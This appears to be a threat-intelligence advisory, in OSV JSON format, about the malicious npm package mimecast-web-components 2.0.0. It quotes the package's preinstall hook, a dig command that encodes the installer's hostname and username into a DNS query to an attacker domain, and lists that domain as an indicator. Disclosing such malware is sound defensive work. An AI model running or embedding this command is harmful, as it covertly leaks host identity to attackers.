@@ -1,0 +1,59 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-3975",
+  "modified": "2026-06-10T17:32:42Z",
+  "published": "2026-06-10T17:32:05Z",
+  "summary": "Malicious code in mimecast-web-components (npm)",
+  "details": "Mimecast-web-components is a combosquat dummy package whose preinstall hook performs DNS-based host-fingerprint exfiltration: it runs dig +short \"$(echo c-$(hostname)-$(whoami) | base32 | tr -d '=' | rev).canary[.]rebind[.]fun[.]offensive[.]work\", encoding the victim's hostname and username into a subdomain query to an attacker-controlled DNS endpoint. The index.js is a 5-line dummy stub disguising the package as combosquat prevention. The DNS exfiltration is a recon beacon that leaks installer identity to the attacker's infrastructure.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "mimecast-web-components",
+        "purl": "pkg:npm/mimecast-web-components@2.0.0"
+      },
+      "versions": [
+        "2.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/mimecast-web-components/v/2.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-3975"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-10T17:32:05Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "canary[.]rebind[.]fun[.]offensive[.]work"
+        ]
+      }
+    }
+  }
+}
